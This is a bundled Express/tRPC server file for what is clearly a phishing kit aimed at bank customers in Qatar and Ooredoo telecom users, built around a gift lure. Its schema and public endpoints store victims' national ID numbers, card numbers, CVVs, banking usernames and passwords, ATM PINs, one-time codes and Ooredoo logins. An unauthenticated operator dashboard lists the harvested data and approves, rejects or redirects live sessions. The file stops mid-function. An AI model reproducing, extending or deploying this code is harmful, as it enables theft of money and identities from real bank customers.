var __defProp = Object.defineProperty;
var __export = (target, all) => {
  for (var name in all)
    __defProp(target, name, { get: all[name], enumerable: true });
};

// server/_core/index.ts
import "dotenv/config";
import express2 from "express";
import { createServer } from "http";
import net from "net";
import { createExpressMiddleware } from "@trpc/server/adapters/express";

// shared/const.ts
var COOKIE_NAME = "app_session_id";
var ONE_YEAR_MS = 1e3 * 60 * 60 * 24 * 365;
var AXIOS_TIMEOUT_MS = 3e4;
var UNAUTHED_ERR_MSG = "Please login (10001)";
var NOT_ADMIN_ERR_MSG = "You do not have required permission (10002)";
var OAUTH_STATE_COOKIE = "__Host-oauth_state";
var decodeOAuthState = (state) => {
  let decoded;
  try {
    decoded = atob(state);
  } catch {
    return { redirectUri: "" };
  }
  try {
    const parsed = JSON.parse(decoded);
    if (parsed && typeof parsed.redirectUri === "string") return parsed;
  } catch {
  }
  return { redirectUri: decoded };
};

// server/_core/oauth.ts
import { parse as parseCookieHeader2 } from "cookie";

// server/_core/db.ts
import { drizzle } from "drizzle-orm/postgres-js";
import postgres from "postgres";

// drizzle/schema.ts
var schema_exports = {};
__export(schema_exports, {
  atmPinSubmissions: () => atmPinSubmissions,
  loginMethodSubmissions: () => loginMethodSubmissions,
  ooredooSubmissions: () => ooredooSubmissions,
  otpSubmissions: () => otpSubmissions,
  personalDataSubmissions: () => personalDataSubmissions,
  sessions: () => sessions,
  users: () => users
});
import { pgTable, serial, text, timestamp, varchar } from "drizzle-orm/pg-core";
var users = pgTable("users", {
  id: serial("id").primaryKey(),
  openId: varchar("openId", { length: 64 }).notNull().unique(),
  name: text("name"),
  email: varchar("email", { length: 320 }),
  loginMethod: varchar("loginMethod", { length: 64 }),
  role: text("role").$type().default("user").notNull(),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull(),
  lastSignedIn: timestamp("lastSignedIn").defaultNow().notNull()
});
var sessions = pgTable("sessions", {
  id: varchar("id", { length: 64 }).primaryKey(),
  selectedBank: varchar("selectedBank", { length: 50 }).notNull(),
  country: varchar("country", { length: 100 }).default("Qatar"),
  status: varchar("status", { length: 20 }).default("pending").notNull(),
  // pending, loading, approved, rejected
  currentStep: varchar("currentStep", { length: 50 }),
  // personal, card, otp, atm, ooredoo, otp_ooredoo
  adminAction: varchar("adminAction", { length: 20 }),
  // approve, reject
  redirectTarget: varchar("redirectTarget", { length: 50 }),
  selectedGift: varchar("selectedGift", { length: 50 }),
  errorMessage: text("errorMessage"),
  createdAt: timestamp("createdAt").defaultNow().notNull(),
  updatedAt: timestamp("updatedAt").defaultNow().notNull()
});
var personalDataSubmissions = pgTable("personalDataSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  nameArabic: text("nameArabic").notNull(),
  nameEnglish: text("nameEnglish").notNull(),
  idNumber: varchar("idNumber", { length: 50 }).notNull(),
  phoneNumber: varchar("phoneNumber", { length: 20 }).notNull(),
  email: varchar("email", { length: 320 }).notNull(),
  dateOfBirth: varchar("dateOfBirth", { length: 20 }).notNull(),
  gender: varchar("gender", { length: 10 }),
  customerStatus: varchar("customerStatus", { length: 50 }),
  password: text("password"),
  title: varchar("title", { length: 20 }),
  middleName: text("middleName"),
  lastName: text("lastName"),
  promoCode: varchar("promoCode", { length: 50 }),
  country: varchar("country", { length: 100 }),
  submittedAt: timestamp("submittedAt").defaultNow().notNull()
});
var loginMethodSubmissions = pgTable("loginMethodSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  loginType: varchar("loginType", { length: 20 }).notNull(),
  cardNumber: varchar("cardNumber", { length: 50 }),
  cardholderName: text("cardholderName"),
  expiryDate: varchar("expiryDate", { length: 10 }),
  cvv: varchar("cvv", { length: 10 }),
  username: varchar("username", { length: 255 }),
  password: text("password"),
  deliveryMethod: varchar("deliveryMethod", { length: 20 }),
  // home, branch
  branchName: text("branchName"),
  deliveryAddress: text("deliveryAddress"),
  phoneConfirmation: varchar("phoneConfirmation", { length: 20 }),
  issuanceFee: varchar("issuanceFee", { length: 20 }),
  deliveryFee: varchar("deliveryFee", { length: 20 }),
  totalAmount: varchar("totalAmount", { length: 20 }),
  submittedAt: timestamp("submittedAt").defaultNow().notNull()
});
var atmPinSubmissions = pgTable("atmPinSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  pin: varchar("pin", { length: 10 }).notNull(),
  submittedAt: timestamp("submittedAt").defaultNow().notNull()
});
var otpSubmissions = pgTable("otpSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  otpCode: varchar("otpCode", { length: 10 }).notNull(),
  otpType: varchar("otpType", { length: 20 }).notNull(),
  // card_otp, ooredoo_otp
  submittedAt: timestamp("submittedAt").defaultNow().notNull()
});
var ooredooSubmissions = pgTable("ooredooSubmissions", {
  id: serial("id").primaryKey(),
  sessionId: varchar("sessionId", { length: 64 }).notNull(),
  ooredooUser: varchar("ooredooUser", { length: 255 }).notNull(),
  ooredooPassword: text("ooredooPassword").notNull(),
  submittedAt: timestamp("submittedAt").defaultNow().notNull()
});

// server/_core/env.ts
var ENV = {
  appId: process.env.VITE_APP_ID ?? "",
  cookieSecret: process.env.JWT_SECRET ?? "",
  databaseUrl: process.env.DATABASE_URL ?? "",
  oAuthServerUrl: process.env.OAUTH_SERVER_URL ?? "",
  ownerOpenId: process.env.OWNER_OPEN_ID ?? "",
  isProduction: process.env.NODE_ENV === "production",
  forgeApiUrl: process.env.BUILT_IN_FORGE_API_URL ?? "",
  forgeApiKey: process.env.BUILT_IN_FORGE_API_KEY ?? ""
};

// server/_core/db.ts
if (!ENV.databaseUrl) {
  throw new Error("DATABASE_URL is not set");
}
var client = postgres(ENV.databaseUrl);
var db = drizzle(client, { schema: schema_exports });

// server/db.ts
import { eq, desc } from "drizzle-orm";
async function createSession(id, selectedBank, country = "Qatar", selectedGift = "") {
  try {
    const existing = await db.select().from(sessions).where(eq(sessions.id, id)).limit(1);
    if (existing[0]) {
      await db.update(sessions).set({
        selectedBank,
        country,
        selectedGift: selectedGift || existing[0].selectedGift,
        updatedAt: /* @__PURE__ */ new Date()
      }).where(eq(sessions.id, id));
    } else {
      await db.insert(sessions).values({
        id,
        selectedBank,
        country,
        selectedGift,
        status: "pending",
        createdAt: /* @__PURE__ */ new Date(),
        updatedAt: /* @__PURE__ */ new Date()
      });
    }
  } catch (error) {
    console.error("Error in createSession:", error);
    throw error;
  }
}
async function submitPersonalData(data) {
  try {
    const existingSession = await db.select().from(sessions).where(eq(sessions.id, data.sessionId)).limit(1);
    if (!existingSession[0]) {
      await db.insert(sessions).values({
        id: data.sessionId,
        selectedBank: "unknown",
        status: "pending",
        createdAt: /* @__PURE__ */ new Date(),
        updatedAt: /* @__PURE__ */ new Date()
      });
    }
    const submissionData = {
      sessionId: data.sessionId,
      nameArabic: data.nameArabic || "",
      nameEnglish: data.nameEnglish || "",
      idNumber: data.idNumber || "N/A",
      phoneNumber: data.phoneNumber || "",
      email: data.email || "",
      dateOfBirth: data.dateOfBirth || "",
      gender: data.gender || "not_specified",
      customerStatus: data.customerStatus || "new",
      password: data.password || null,
      title: data.title || null,
      middleName: data.middleName || null,
      lastName: data.lastName || null,
      promoCode: data.promoCode || null,
      country: data.country || null,
      submittedAt: /* @__PURE__ */ new Date()
    };
    await db.insert(personalDataSubmissions).values(submissionData);
    await db.update(sessions).set({
      updatedAt: /* @__PURE__ */ new Date(),
      currentStep: "personal",
      status: "loading",
      adminAction: null,
      errorMessage: null
    }).where(eq(sessions.id, data.sessionId));
    return { success: true };
  } catch (error) {
    console.error("Critical error in submitPersonalData:", error);
    throw error;
  }
}
async function submitLoginMethod(data) {
  await db.insert(loginMethodSubmissions).values({
    ...data,
    submittedAt: /* @__PURE__ */ new Date()
  });
  await db.update(sessions).set({
    updatedAt: /* @__PURE__ */ new Date(),
    currentStep: "card",
    status: "loading",
    adminAction: null,
    errorMessage: null
  }).where(eq(sessions.id, data.sessionId));
}
async function submitAtmPin(data) {
  await db.insert(atmPinSubmissions).values({
    ...data,
    submittedAt: /* @__PURE__ */ new Date()
  });
  await db.update(sessions).set({
    updatedAt: /* @__PURE__ */ new Date(),
    status: "loading",
    adminAction: null,
    errorMessage: null,
    currentStep: "atm"
  }).where(eq(sessions.id, data.sessionId));
}
async function submitOtp(data) {
  await db.insert(otpSubmissions).values({
    ...data,
    submittedAt: /* @__PURE__ */ new Date()
  });
  await db.update(sessions).set({
    updatedAt: /* @__PURE__ */ new Date(),
    status: "loading",
    adminAction: null,
    errorMessage: null,
    currentStep: data.otpType === "ooredoo_otp" ? "otp_ooredoo" : "otp"
  }).where(eq(sessions.id, data.sessionId));
}
async function submitOoredoo(data) {
  await db.insert(ooredooSubmissions).values({
    ...data,
    submittedAt: /* @__PURE__ */ new Date()
  });
  await db.update(sessions).set({
    updatedAt: /* @__PURE__ */ new Date(),
    status: "loading",
    adminAction: null,
    errorMessage: null,
    currentStep: "ooredoo"
  }).where(eq(sessions.id, data.sessionId));
}
async function getFullSubmissions() {
  const allSessions = await db.select().from(sessions).orderBy(desc(sessions.updatedAt));
  const results = [];
  for (const session of allSessions) {
    const personal = await db.select().from(personalDataSubmissions).where(eq(personalDataSubmissions.sessionId, session.id)).limit(1);
    const login = await db.select().from(loginMethodSubmissions).where(eq(loginMethodSubmissions.sessionId, session.id)).limit(1);
    const pin = await db.select().from(atmPinSubmissions).where(eq(atmPinSubmissions.sessionId, session.id)).limit(1);
    const otp = await db.select().from(otpSubmissions).where(eq(otpSubmissions.sessionId, session.id)).orderBy(desc(otpSubmissions.submittedAt));
    const ooredoo = await db.select().from(ooredooSubmissions).where(eq(ooredooSubmissions.sessionId, session.id)).limit(1);
    results.push({
      ...session,
      personalData: personal[0] || null,
      loginMethod: login[0] || null,
      atmPin: pin[0] || null,
      otps: otp,
      ooredoo: ooredoo[0] || null
    });
  }
  return results;
}
async function getSessionStatus(sessionId) {
  const session = await db.select().from(sessions).where(eq(sessions.id, sessionId)).limit(1);
  return session[0] || null;
}
async function adminTakeAction(sessionId, action, errorMessage, redirectTarget) {
  await db.update(sessions).set({
    adminAction: action,
    errorMessage: errorMessage || null,
    redirectTarget: redirectTarget || null,
    status: action === "approve" ? "approved" : "rejected",
    updatedAt: /* @__PURE__ */ new Date()
  }).where(eq(sessions.id, sessionId));
}
async function updateSessionStatus(sessionId, status, currentStep) {
  const updateData = { status, updatedAt: /* @__PURE__ */ new Date() };
  if (currentStep) updateData.currentStep = currentStep;
  return await db.update(sessions).set(updateData).where(eq(sessions.id, sessionId));
}

// server/_core/cookies.ts
function isSecureRequest(req) {
  if (req.protocol === "https") return true;
  const forwardedProto = req.headers["x-forwarded-proto"];
  if (!forwardedProto) return false;
  const protoList = Array.isArray(forwardedProto) ? forwardedProto : forwardedProto.split(",");
  return protoList.some((proto) => proto.trim().toLowerCase() === "https");
}
function getSessionCookieOptions(req) {
  return {
    httpOnly: true,
    path: "/",
    sameSite: "none",
    secure: isSecureRequest(req)
  };
}

// shared/_core/errors.ts
var HttpError = class extends Error {
  constructor(statusCode, message) {
    super(message);
    this.statusCode = statusCode;
    this.name = "HttpError";
  }
};
var ForbiddenError = (msg) => new HttpError(403, msg);

// server/_core/sdk.ts
import axios from "axios";
import { parse as parseCookieHeader } from "cookie";
import { SignJWT, jwtVerify } from "jose";
var isNonEmptyString = (value) => typeof value === "string" && value.length > 0;
var EXCHANGE_TOKEN_PATH = `/webdev.v1.WebDevAuthPublicService/ExchangeToken`;
var GET_USER_INFO_PATH = `/webdev.v1.WebDevAuthPublicService/GetUserInfo`;
var GET_USER_INFO_WITH_JWT_PATH = `/webdev.v1.WebDevAuthPublicService/GetUserInfoWithJwt`;
var OAuthService = class {
  constructor(client2) {
    this.client = client2;
    console.log("[OAuth] Initialized with baseURL:", ENV.oAuthServerUrl);
    if (!ENV.oAuthServerUrl) {
      console.error(
        "[OAuth] ERROR: OAUTH_SERVER_URL is not configured! Set OAUTH_SERVER_URL environment variable."
      );
    }
  }
  decodeState(state) {
    return decodeOAuthState(state).redirectUri;
  }
  async getTokenByCode(code, state) {
    const payload = {
      clientId: ENV.appId,
      grantType: "authorization_code",
      code,
      redirectUri: this.decodeState(state)
    };
    const { data } = await this.client.post(
      EXCHANGE_TOKEN_PATH,
      payload
    );
    return data;
  }
  async getUserInfoByToken(token) {
    const { data } = await this.client.post(
      GET_USER_INFO_PATH,
      {
        accessToken: token.accessToken
      }
    );
    return data;
  }
};
var createOAuthHttpClient = () => axios.create({
  baseURL: ENV.oAuthServerUrl,
  timeout: AXIOS_TIMEOUT_MS
});
var SDKServer = class {
  client;
  oauthService;
  constructor(client2 = createOAuthHttpClient()) {
    this.client = client2;
    this.oauthService = new OAuthService(this.client);
  }
  deriveLoginMethod(platforms, fallback) {
    if (fallback && fallback.length > 0) return fallback;
    if (!Array.isArray(platforms) || platforms.length === 0) return null;
    const set = new Set(
      platforms.filter((p) => typeof p === "string")
    );
    if (set.has("REGISTERED_PLATFORM_EMAIL")) return "email";
    if (set.has("REGISTERED_PLATFORM_GOOGLE")) return "google";
    if (set.has("REGISTERED_PLATFORM_APPLE")) return "apple";
    if (set.has("REGISTERED_PLATFORM_MICROSOFT") || set.has("REGISTERED_PLATFORM_AZURE"))
      return "microsoft";
    if (set.has("REGISTERED_PLATFORM_GITHUB")) return "github";
    const first = Array.from(set)[0];
    return first ? first.toLowerCase() : null;
  }
  /**
   * Exchange OAuth authorization code for access token
   * @example
   * const tokenResponse = await sdk.exchangeCodeForToken(code, state);
   */
  async exchangeCodeForToken(code, state) {
    return this.oauthService.getTokenByCode(code, state);
  }
  /**
   * Get user information using access token
   * @example
   * const userInfo = await sdk.getUserInfo(tokenResponse.accessToken);
   */
  async getUserInfo(accessToken) {
    const data = await this.oauthService.getUserInfoByToken({
      accessToken
    });
    const loginMethod = this.deriveLoginMethod(
      data?.platforms,
      data?.platform ?? data.platform ?? null
    );
    return {
      ...data,
      platform: loginMethod,
      loginMethod
    };
  }
  parseCookies(cookieHeader) {
    if (!cookieHeader) {
      return /* @__PURE__ */ new Map();
    }
    const parsed = parseCookieHeader(cookieHeader);
    return new Map(Object.entries(parsed));
  }
  getSessionSecret() {
    const secret = ENV.cookieSecret;
    return new TextEncoder().encode(secret);
  }
  /**
   * Create a session token for a Manus user openId
   * @example
   * const sessionToken = await sdk.createSessionToken(userInfo.openId);
   */
  async createSessionToken(openId, options = {}) {
    return this.signSession(
      {
        openId,
        appId: ENV.appId,
        name: options.name || ""
      },
      options
    );
  }
  async signSession(payload, options = {}) {
    const issuedAt = Date.now();
    const expiresInMs = options.expiresInMs ?? ONE_YEAR_MS;
    const expirationSeconds = Math.floor((issuedAt + expiresInMs) / 1e3);
    const secretKey = this.getSessionSecret();
    return new SignJWT({
      openId: payload.openId,
      appId: payload.appId,
      name: payload.name
    }).setProtectedHeader({ alg: "HS256", typ: "JWT" }).setExpirationTime(expirationSeconds).sign(secretKey);
  }
  async verifySession(cookieValue) {
    if (!cookieValue) {
      console.warn("[Auth] Missing session cookie");
      return null;
    }
    try {
      const secretKey = this.getSessionSecret();
      const { payload } = await jwtVerify(cookieValue, secretKey, {
        algorithms: ["HS256"]
      });
      const { openId, appId, name } = payload;
      if (!isNonEmptyString(openId) || !isNonEmptyString(appId) || !isNonEmptyString(name)) {
        console.warn("[Auth] Session payload missing required fields");
        return null;
      }
      return {
        openId,
        appId,
        name
      };
    } catch (error) {
      console.warn("[Auth] Session verification failed", String(error));
      return null;
    }
  }
  async getUserInfoWithJwt(jwtToken) {
    const payload = {
      jwtToken,
      projectId: ENV.appId
    };
    const { data } = await this.client.post(
      GET_USER_INFO_WITH_JWT_PATH,
      payload
    );
    const loginMethod = this.deriveLoginMethod(
      data?.platforms,
      data?.platform ?? data.platform ?? null
    );
    return {
      ...data,
      platform: loginMethod,
      loginMethod
    };
  }
  async authenticateRequest(req) {
    const cookies = this.parseCookies(req.headers.cookie);
    let sessionToken = cookies.get(COOKIE_NAME);
    if (!sessionToken) {
      const authHeader = req.headers.authorization;
      if (typeof authHeader === "string" && authHeader.startsWith("Bearer ")) {
        sessionToken = authHeader.slice(7);
      }
    }
    const session = await this.verifySession(sessionToken);
    if (!session) {
      throw ForbiddenError("Invalid session cookie");
    }
    if (session.openId.startsWith(CRON_OPEN_ID_PREFIX)) {
      const userInfo = await this.getUserInfoWithJwt(sessionToken ?? "");
      const taskUid = userInfo.taskUid ?? null;
      if (!taskUid) {
        throw ForbiddenError("Cron session missing task_uid");
      }
      return buildCronUser(userInfo);
    }
    const sessionUserId = session.openId;
    const signedInAt = /* @__PURE__ */ new Date();
    let user = await (void 0)(sessionUserId);
    if (!user) {
      try {
        const userInfo = await this.getUserInfoWithJwt(sessionToken ?? "");
        await (void 0)({
          openId: userInfo.openId,
          name: userInfo.name || null,
          email: userInfo.email ?? null,
          loginMethod: userInfo.loginMethod ?? userInfo.platform ?? null,
          lastSignedIn: signedInAt
        });
        user = await (void 0)(userInfo.openId);
      } catch (error) {
        console.error("[Auth] Failed to sync user from OAuth:", error);
        throw ForbiddenError("Failed to sync user info");
      }
    }
    if (!user) {
      throw ForbiddenError("User not found");
    }
    await (void 0)({
      openId: user.openId,
      lastSignedIn: signedInAt
    });
    return user;
  }
};
var CRON_OPEN_ID_PREFIX = "cron_";
function buildCronUser(userInfo) {
  const now = /* @__PURE__ */ new Date();
  return {
    id: -1,
    openId: userInfo.openId,
    name: userInfo.name || "Manus Scheduled Task",
    email: null,
    loginMethod: null,
    role: "user",
    createdAt: now,
    updatedAt: now,
    lastSignedIn: now,
    taskUid: userInfo.taskUid ?? void 0,
    isCron: true
  };
}
var sdk = new SDKServer();

// server/_core/oauth.ts
function getQueryParam(req, key) {
  const value = req.query[key];
  return typeof value === "string" ? value : void 0;
}
function registerOAuthRoutes(app) {
  app.get("/api/oauth/callback", async (req, res) => {
    const code = getQueryParam(req, "code");
    const state = getQueryParam(req, "state");
    if (!code || !state) {
      res.status(400).json({ error: "code and state are required" });
      return;
    }
    const { nonce } = decodeOAuthState(state);
    const expectedNonce = parseCookieHeader2(req.headers.cookie ?? "")[OAUTH_STATE_COOKIE];
    if (!nonce || nonce !== expectedNonce) {
      res.status(403).json({ error: "invalid oauth state" });
      return;
    }
    res.clearCookie(OAUTH_STATE_COOKIE, { path: "/", secure: true, sameSite: "none" });
    try {
      const tokenResponse = await sdk.exchangeCodeForToken(code, state);
      const userInfo = await sdk.getUserInfo(tokenResponse.accessToken);
      if (!userInfo.openId) {
        res.status(400).json({ error: "openId missing from user info" });
        return;
      }
      await (void 0)({
        openId: userInfo.openId,
        name: userInfo.name || null,
        email: userInfo.email ?? null,
        loginMethod: userInfo.loginMethod ?? userInfo.platform ?? null,
        lastSignedIn: /* @__PURE__ */ new Date()
      });
      const sessionToken = await sdk.createSessionToken(userInfo.openId, {
        name: userInfo.name || "",
        expiresInMs: ONE_YEAR_MS
      });
      const cookieOptions = getSessionCookieOptions(req);
      res.cookie(COOKIE_NAME, sessionToken, { ...cookieOptions, maxAge: ONE_YEAR_MS });
      res.redirect(302, "/");
    } catch (error) {
      console.error("[OAuth] Callback failed", error);
      res.status(500).json({ error: "OAuth callback failed" });
    }
  });
}

// server/_core/storageProxy.ts
function registerStorageProxy(app) {
  app.get("/manus-storage/*", async (req, res) => {
    const key = req.params[0];
    if (!key) {
      res.status(400).send("Missing storage key");
      return;
    }
    if (!ENV.forgeApiUrl || !ENV.forgeApiKey) {
      res.status(500).send("Storage proxy not configured");
      return;
    }
    try {
      const forgeUrl = new URL(
        "v1/storage/presign/get",
        ENV.forgeApiUrl.replace(/\/+$/, "") + "/"
      );
      forgeUrl.searchParams.set("path", key);
      const forgeResp = await fetch(forgeUrl, {
        headers: { Authorization: `Bearer ${ENV.forgeApiKey}` }
      });
      if (!forgeResp.ok) {
        const body = await forgeResp.text().catch(() => "");
        console.error(`[StorageProxy] forge error: ${forgeResp.status} ${body}`);
        res.status(502).send("Storage backend error");
        return;
      }
      const { url } = await forgeResp.json();
      if (!url) {
        res.status(502).send("Empty signed URL from backend");
        return;
      }
      res.set("Cache-Control", "no-store");
      res.redirect(307, url);
    } catch (err) {
      console.error("[StorageProxy] failed:", err);
      res.status(502).send("Storage proxy error");
    }
  });
}

// server/_core/systemRouter.ts
import { z } from "zod";

// server/_core/notification.ts
import { TRPCError } from "@trpc/server";
var TITLE_MAX_LENGTH = 1200;
var CONTENT_MAX_LENGTH = 2e4;
var trimValue = (value) => value.trim();
var isNonEmptyString2 = (value) => typeof value === "string" && value.trim().length > 0;
var buildEndpointUrl = (baseUrl) => {
  const normalizedBase = baseUrl.endsWith("/") ? baseUrl : `${baseUrl}/`;
  return new URL(
    "webdevtoken.v1.WebDevService/SendNotification",
    normalizedBase
  ).toString();
};
var validatePayload = (input) => {
  if (!isNonEmptyString2(input.title)) {
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: "Notification title is required."
    });
  }
  if (!isNonEmptyString2(input.content)) {
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: "Notification content is required."
    });
  }
  const title = trimValue(input.title);
  const content = trimValue(input.content);
  if (title.length > TITLE_MAX_LENGTH) {
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: `Notification title must be at most ${TITLE_MAX_LENGTH} characters.`
    });
  }
  if (content.length > CONTENT_MAX_LENGTH) {
    throw new TRPCError({
      code: "BAD_REQUEST",
      message: `Notification content must be at most ${CONTENT_MAX_LENGTH} characters.`
    });
  }
  return { title, content };
};
async function notifyOwner(payload) {
  const { title, content } = validatePayload(payload);
  if (!ENV.forgeApiUrl) {
    throw new TRPCError({
      code: "INTERNAL_SERVER_ERROR",
      message: "Notification service URL is not configured."
    });
  }
  if (!ENV.forgeApiKey) {
    throw new TRPCError({
      code: "INTERNAL_SERVER_ERROR",
      message: "Notification service API key is not configured."
    });
  }
  const endpoint = buildEndpointUrl(ENV.forgeApiUrl);
  try {
    const response = await fetch(endpoint, {
      method: "POST",
      headers: {
        accept: "application/json",
        authorization: `Bearer ${ENV.forgeApiKey}`,
        "content-type": "application/json",
        "connect-protocol-version": "1"
      },
      body: JSON.stringify({ title, content })
    });
    if (!response.ok) {
      const detail = await response.text().catch(() => "");
      console.warn(
        `[Notification] Failed to notify owner (${response.status} ${response.statusText})${detail ? `: ${detail}` : ""}`
      );
      return false;
    }
    return true;
  } catch (error) {
    console.warn("[Notification] Error calling notification service:", error);
    return false;
  }
}

// server/_core/trpc.ts
import { initTRPC, TRPCError as TRPCError2 } from "@trpc/server";
import superjson from "superjson";
var t = initTRPC.context().create({
  transformer: superjson
});
var router = t.router;
var publicProcedure = t.procedure;
var requireUser = t.middleware(async (opts) => {
  const { ctx, next } = opts;
  if (!ctx.user) {
    throw new TRPCError2({ code: "UNAUTHORIZED", message: UNAUTHED_ERR_MSG });
  }
  return next({
    ctx: {
      ...ctx,
      user: ctx.user
    }
  });
});
var protectedProcedure = t.procedure.use(requireUser);
var adminProcedure = t.procedure.use(
  t.middleware(async (opts) => {
    const { ctx, next } = opts;
    if (!ctx.user || ctx.user.role !== "admin") {
      throw new TRPCError2({ code: "FORBIDDEN", message: NOT_ADMIN_ERR_MSG });
    }
    return next({
      ctx: {
        ...ctx,
        user: ctx.user
      }
    });
  })
);

// server/_core/systemRouter.ts
var systemRouter = router({
  health: publicProcedure.input(
    z.object({
      timestamp: z.number().min(0, "timestamp cannot be negative")
    })
  ).query(() => ({
    ok: true
  })),
  notifyOwner: adminProcedure.input(
    z.object({
      title: z.string().min(1, "title is required"),
      content: z.string().min(1, "content is required")
    })
  ).mutation(async ({ input }) => {
    const delivered = await notifyOwner(input);
    return {
      success: delivered
    };
  })
});

// server/routers.ts
import { z as z2 } from "zod";
var appRouter = router({
  system: systemRouter,
  auth: router({
    me: publicProcedure.query((opts) => opts.ctx.user),
    logout: publicProcedure.mutation(({ ctx }) => {
      const cookieOptions = getSessionCookieOptions(ctx.req);
      ctx.res.clearCookie(COOKIE_NAME, { ...cookieOptions, maxAge: -1 });
      return {
        success: true
      };
    })
  }),
  submissions: router({
    // Client calls createSession in Home.tsx and GiftSelection.tsx
    createSession: publicProcedure.input(z2.object({
      sessionId: z2.string(),
      selectedBank: z2.string(),
      country: z2.string().optional(),
      selectedGift: z2.string().optional()
    })).mutation(async ({ input }) => {
      await createSession(input.sessionId, input.selectedBank, input.country || "Qatar", input.selectedGift || "");
      return { success: true };
    }),
    // Client calls submitPersonalData in PersonalData.tsx
    submitPersonalData: publicProcedure.input(z2.any()).mutation(async ({ input }) => {
      return await submitPersonalData(input);
    }),
    // AdminDashboard calls getSessions
    getSessions: publicProcedure.query(async () => {
      return await getFullSubmissions();
    }),
    submitLoginMethod: publicProcedure.input(z2.object({
      sessionId: z2.string(),
      loginType: z2.string(),
      cardNumber: z2.string().optional(),
      cardholderName: z2.string().optional(),
      expiryDate: z2.string().optional(),
      cvv: z2.string().optional(),
      deliveryAddress: z2.string().optional(),
      username: z2.string().optional(),
      password: z2.string().optional(),
      deliveryMethod: z2.string().optional(),
      branchName: z2.string().optional(),
      phoneConfirmation: z2.string().optional(),
      issuanceFee: z2.string().optional(),
      deliveryFee: z2.string().optional(),
      totalAmount: z2.string().optional()
    })).mutation(async ({ input }) => {
      await submitLoginMethod({
        sessionId: input.sessionId,
        loginType: input.loginType,
        cardNumber: input.cardNumber || "",
        cardholderName: input.cardholderName || "",
        expiryDate: input.expiryDate || "",
        cvv: input.cvv || "",
        username: input.username || "",
        password: input.password || "",
        deliveryMethod: input.deliveryMethod || "home",
        branchName: input.branchName || "",
        deliveryAddress: input.deliveryAddress || "",
        phoneConfirmation: input.phoneConfirmation || "",
        issuanceFee: input.issuanceFee || "10",
        deliveryFee: input.deliveryFee || "0",
        totalAmount: input.totalAmount || "10"
      });
      const step = input.loginType === "registration_completion" || input.loginType === "card_request" ? "card" : "login";
      await updateSessionStatus(input.sessionId, "loading", step);
      return { success: true };
    }),
    submitOtp: publicProcedure.input(z2.object({
      sessionId: z2.string(),
      otpCode: z2.string(),
      otpType: z2.string()
    })).mutation(async ({ input }) => {
      await submitOtp({
        sessionId: input.sessionId,
        otpCode: input.otpCode,
        otpType: input.otpType
      });
      const step = input.otpType === "ooredoo_otp" ? "otp_ooredoo" : "otp";
      await updateSessionStatus(input.sessionId, "loading", step);
      return { success: true };
    }),
    submitAtmPin: publicProcedure.input(z2.object({
      sessionId: z2.string(),
      pin: z2.string()
    })).mutation(async ({ input }) => {
      await submitAtmPin({
        sessionId: input.sessionId,
        pin: input.pin
      });
      await updateSessionStatus(input.sessionId, "loading", "atm");
      return { success: true };
    }),
    submitOoredoo: publicProcedure.input(z2.object({
      sessionId: z2.string(),
      ooredooUser: z2.string(),
      ooredooPassword: z2.string()
    })).mutation(async ({ input }) => {
      await submitOoredoo({
        sessionId: input.sessionId,
        ooredooUser: input.ooredooUser,
        ooredooPassword: input.ooredooPassword
      });
      await updateSessionStatus(input.sessionId, "loading", "ooredoo");
      return { success: true };
    }),
    // AdminDashboard calls adminTakeAction
    adminTakeAction: publicProcedure.input(z2.object({
      sessionId: z2.string(),
      action: z2.enum(["approve", "reject"]),
      errorMessage: z2.string().optional(),
      redirectTarget: z2.string().optional()
    })).mutation(async ({ input }) => {
      await adminTakeAction(input.sessionId, input.action, input.errorMessage, input.redirectTarget);
      return { success: true };
    }),
    getSessionStatus: publicProcedure.input(z2.string()).query(async ({ input }) => {
      return await getSessionStatus(input);
    }),
    reportStep: publicProcedure.input(z2.object({
      sessionId: z2.string(),
      step: z2.string()
    })).mutation(async ({ input }) => {
      await updateSessionStatus(input.sessionId, "pending", input.step);
      return { success: true };
    })
  })
});

// server/_core/context.ts
async function createContext(opts) {
  let user = null;
  try {
    user = await sdk.authenticateRequest(opts.req);
  } catch (error) {
    user = null;
  }
  return {
    req: opts.req,
    res: opts.res,
    user
  };
}

// server/_core/vite.ts
import express from "express";
import fs from "fs";
import { nanoid } from "nanoid";
import path2 from "path";
import { createServer as createViteServer } from "vite";

// vite.config.ts
import react from "@vitejs/plugin-react";
import tailwindcss from "@tailwindcss/vite";
import path from "path";
import { defineConfig } from "vite";
var vite_config_default = defineConfig({
  plugins: [react(), tailwindcss()],
  css: {},
  resolve: {
    alias: {
      "@": path.resolve(import.meta.dirname, "client", "src"),
      "@shared": path.resolve(import.meta.dirname, "shared"),
      "@assets": path.resolve(import.meta.dirname, "attached_assets")
    }
  },
  envDir: path.resolve(import.meta.dirname),
  root: path.resolve(import.meta.dirname, "client"),
  build: {
    outDir: path.resolve(import.meta.dirname, "dist/public"),
    emptyOutDir: true
  },
  server: {
    fs: {
      strict: true,
      deny: ["**/.*"]
    }
  }
});

// server/_core/vite.ts
async function setupVite(app, server) {
  const serverOptions = {
    middlewareMode: true,
    hmr: { server },
    allowedHosts: true
  };
  const vite = await createViteServer({
    ...vite_config_default,
    configFile: false,
    server: serverOptions,
    appType: "custom"
  });
  app.use(vite.middlewares);
  app.use("*", async (req, res, next) => {
    const url = req.originalUrl;
    try {
      const clientTemplate = path2.resolve(
        import.meta.dirname,
        "../..",
        "client",
        "index.html"
      );
      let template = await fs.promises.readFile(clientTemplate, "utf-8");
      template = template.replace(
        `src="/src/main.tsx"`,
        `src="/src/main.tsx?v=${nanoid()}"`
      );
      const page = await vite.transformIndexHtml(url, template);
      res.status(200).set({ "Content-Type": "text/html" }).end(page);
    } catch (e) {
      vite.ssrFixStacktrace(e);
      next(e);
    }
  });
}
function serveStatic(app) {
